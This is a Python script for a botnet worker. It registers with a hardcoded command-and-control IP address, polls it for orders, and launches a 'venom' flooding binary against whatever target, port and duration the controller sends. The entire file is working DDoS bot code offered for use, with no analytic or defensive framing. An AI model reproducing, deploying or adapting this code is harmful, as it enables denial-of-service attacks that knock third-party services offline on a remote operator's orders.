#!/usr/bin/env python3
import subprocess
import threading
import time
import requests
import os
import platform
import sys

class VPSWorker:
    def __init__(self, control_server="http://37.114.46.10:443"):
        self.control_server = control_server
        self.vps_id = f"vps_{int(time.time())}_{os.urandom(4).hex()}"
        self.session_token = os.urandom(16).hex()
        self.registered = False
        self.last_command = None
        self.active_attack = None
        self.poll_interval = 30  # seconds
        self.running = True
        
        print(f"[VPS Worker] Initializing...")
        print(f"[VPS Worker] ID: {self.vps_id}")
        print(f"[VPS Worker] Control Server: {control_server}")
    
    def check_venom(self):
        """Check if venom binary exists"""
        venom_binary = "venom" if platform.system() != "Windows" else "venom.exe"
        venom_path = os.path.join(os.getcwd(), venom_binary)
        
        if os.path.exists(venom_path):
            # Check if executable
            if platform.system() != "Windows":
                os.chmod(venom_path, 0o755)
            return True
        return False
    
    def register(self):
        """Register with control server"""
        try:
            print(f"[VPS Worker] Registering with control server...")
            
            vps_info = {
                'vps_id': self.vps_id,
                'session_token': self.session_token,
                'platform': platform.system(),
                'venom_ready': self.check_venom(),
                'timestamp': time.time()
            }
            
            response = requests.post(
                f"{self.control_server}/register",
                json=vps_info,
                timeout=10
            )
            
            if response.status_code == 200:
                self.registered = True
                data = response.json()
                self.poll_interval = data.get('poll_interval', 30)
                print(f"[VPS Worker] ✅ Registered successfully")
                print(f"[VPS Worker] Poll interval: {self.poll_interval}s")
                return True
            else:
                print(f"[VPS Worker] ❌ Registration failed")
                return False
                
        except Exception as e:
            print(f"[VPS Worker] ❌ Registration error: {e}")
            return False
    
    def poll_for_commands(self):
        """Poll control server for commands"""
        while self.running:
            try:
                if not self.registered:
                    # Try to re-register
                    self.register()
                    if not self.registered:
                        time.sleep(60)  # Wait longer before retry
                        continue
                
                # Prepare poll data
                poll_data = {
                    'vps_id': self.vps_id,
                    'session_token': self.session_token,
                    'status': 'online',
                    'last_command': self.last_command,
                    'timestamp': time.time()
                }
                
                print(f"[VPS Worker] 🔄 Polling for commands...")
                
                response = requests.post(
                    f"{self.control_server}/poll",
                    json=poll_data,
                    timeout=15
                )
                
                if response.status_code == 200:
                    data = response.json()
                    
                    # Check for commands
                    if data.get('has_command'):
                        command = data.get('command')
                        params = data.get('params', {})
                        
                        if command == 'attack' and params.get('target'):
                            print(f"[VPS Worker] ⚡ Received attack command!")
                            self.execute_attack(params)
                        elif command == 'ping':
                            print(f"[VPS Worker] 📡 Ping received")
                        elif command == 'stop':
                            print(f"[VPS Worker] ⏹️ Stop command received")
                            self.running = False
                            break
                    
                    # Check for direct attack in response
                    elif data.get('target'):
                        print(f"[VPS Worker] ⚡ Received direct attack command!")
                        self.execute_attack(data)
                    
                    print(f"[VPS Worker] ✅ Poll successful")
                    
                elif response.status_code == 404:
                    print(f"[VPS Worker] ⚠️ VPS not found, re-registering...")
                    self.registered = False
                
                else:
                    print(f"[VPS Worker] ⚠️ Poll failed: {response.status_code}")
                
            except requests.exceptions.Timeout:
                print(f"[VPS Worker] ⚠️ Poll timeout")
            except requests.exceptions.ConnectionError:
                print(f"[VPS Worker] ⚠️ Connection error")
            except Exception as e:
                print(f"[VPS Worker] ❌ Poll error: {e}")
            
            # Wait before next poll
            print(f"[VPS Worker] ⏳ Waiting {self.poll_interval}s for next poll...")
            for _ in range(self.poll_interval):
                if not self.running:
                    break
                time.sleep(1)
    
    def execute_attack(self, params):
        """Execute attack command"""
        target = params.get('target')
        port = params.get('port', 80)
        duration = params.get('time', 60)
        threads = params.get('threads', 4)
        
        if not target:
            print(f"[VPS Worker] ❌ No target specified in command")
            return
        
        # Update last command
        self.last_command = {
            'target': target,
            'port': port,
            'time': duration,
            'threads': threads,
            'timestamp': time.time(),
            'status': 'starting'
        }
        
        print(f"[VPS Worker] 🚀 Starting attack: {target}:{port} for {duration}s with {threads} threads")
        
        # Start attack in background
        attack_thread = threading.Thread(
            target=self.run_venom_attack,
            args=(target, port, duration, threads)
        )
        attack_thread.daemon = True
        attack_thread.start()
    
    def run_venom_attack(self, target, port, duration, threads):
        """Run venom attack"""
        try:
            venom_binary = "venom" if platform.system() != "Windows" else "venom.exe"
            venom_path = os.path.join(os.getcwd(), venom_binary)
            
            if not os.path.exists(venom_path):
                print(f"[VPS Worker] ❌ Venom not found: {venom_path}")
                self.last_command['status'] = 'failed: venom not found'
                return
            
            # Update status
            self.last_command['status'] = 'running'
            self.active_attack = {
                'target': target,
                'port': port,
                'start_time': time.time(),
                'duration': duration
            }
            
            print(f"[VPS Worker] ⚡ Executing: {venom_binary} {target} {port} {duration} {threads}")
            
            # Run venom
            cmd = [venom_path, str(target), str(port), str(duration), str(threads)]
            
            # For Windows, use shell=True
            if platform.system() == "Windows":
                cmd_str = ' '.join(cmd)
                result = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=duration + 10)
            else:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=duration + 10)
            
            if result.returncode == 0:
                print(f"[VPS Worker] ✅ Attack completed successfully")
                self.last_command['status'] = 'completed'
                if result.stdout:
                    print(f"[VPS Worker] Output: {result.stdout[:200]}...")
            else:
                print(f"[VPS Worker] ⚠️ Attack finished with errors")
                self.last_command['status'] = 'completed_with_errors'
                if result.stderr:
                    print(f"[VPS Worker] Error: {result.stderr[:200]}")
                    
        except subprocess.TimeoutExpired:
            print(f"[VPS Worker] ✅ Attack completed (normal timeout)")
            self.last_command['status'] = 'completed'
        except Exception as e:
            print(f"[VPS Worker] ❌ Attack failed: {e}")
            self.last_command['status'] = f'failed: {str(e)[:50]}'
        finally:
            self.active_attack = None
    
    def start(self):
        """Start the VPS worker"""
        print(f"[VPS Worker] 🚀 Starting VPS Worker...")
        
        # Register first
        if not self.register():
            print(f"[VPS Worker] ⚠️ Registration failed, will retry in polling loop")
        
        # Start polling thread
        poll_thread = threading.Thread(target=self.poll_for_commands)
        poll_thread.daemon = True
        poll_thread.start()
        
        print(f"[VPS Worker] ✅ Worker started successfully")
        print(f"[VPS Worker] 📡 Polling control server every {self.poll_interval}s")
        print(f"[VPS Worker] ⚡ Waiting for attack commands...")
        print(f"[VPS Worker] Press Ctrl+C to stop")
        
        # Keep main thread alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n[VPS Worker] ⏹️ Stopping...")
            self.running = False
        
        print(f"[VPS Worker] 👋 Worker stopped")

def main():
    """Main function"""
    print("=" * 50)
    print("VPS Worker - No Public IP Needed")
    print("=" * 50)
    
    # Get control server URL (optional argument)
    control_server = "http://37.114.46.10:443"
    if len(sys.argv) > 1:
        control_server = sys.argv[1]
    
    # Create and start worker
    worker = VPSWorker(control_server=control_server)
    worker.start()

if __name__ == "__main__":
    main()
